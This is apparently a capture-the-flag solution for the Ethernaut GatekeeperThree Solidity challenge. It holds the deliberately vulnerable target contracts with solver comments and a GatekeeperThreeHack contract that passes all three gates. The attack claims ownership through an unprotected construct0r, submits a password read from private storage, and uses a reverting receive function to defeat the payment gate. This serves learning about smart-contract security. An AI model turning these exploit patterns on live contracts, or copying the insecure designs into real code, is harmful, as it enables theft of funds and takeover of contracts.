// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}


// GOERLI address - 0x8996b99CC802C4AD7e13CFaFc52B515ba3f0B158
contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  // Bad constructor here, call this as contract to get first gate
  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  // Just need to creep the storage slots for password here and submit using hte
  // getAllowance below, ignore trickystrick this will get us in
  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  //Pay this balance and in the owner contract we set return false on a payment from send in our receive function
  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive () external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract GatekeeperThreeHack {
  GatekeeperThree public gatekeeperThreeContract;
  address public owner;
  uint public gatePassword;

  constructor(address _target) {
    owner = msg.sender;
    gatekeeperThreeContract = GatekeeperThree(payable(address(_target)));
  }

  modifier ownerOnly() {
    require(msg.sender == owner);
    _;
  }

  function enterGate() public ownerOnly {
    // Our function to attack the gate after we set up with functions below
    require(gatekeeperThreeContract.enter(), 'Enter failed');
  }


  function claimOwnership() public {
    // Claim ownership of gatekeeper three by caling bad construct0r function
    // This will get us gate one.
    gatekeeperThreeContract.construct0r();
  }

  function generateTrick() public ownerOnly {
    // Create a trick and set password to block.timestamp
    // as the SimpleTrick will. We will see if this matches, if not we will
    // Add a function to update password and we can just peek at it by reading
    // Storage w/ cast storage instead
    gatekeeperThreeContract.createTrick();
    gatePassword = block.timestamp;
  }

  function updatedPassword(uint _password) public ownerOnly {
    gatePassword = _password;
  }

  function submitPassword() public ownerOnly {
    // This along with our createingTrick/ updating password should ge tus gate two
    gatekeeperThreeContract.getAllowance(gatePassword);
  }

  // Gate three will receive a send payment and return false to pass.
  // We(attack contract) are owner becasue we called bad construct0r
  // Can see fallback of send functions here based on type of send,
  // We will setup a receive
  receive () external payable {
    // Only accept if not owner so we can still send
    if(!(msg.sender == owner)) {
      revert();
    }
  }
}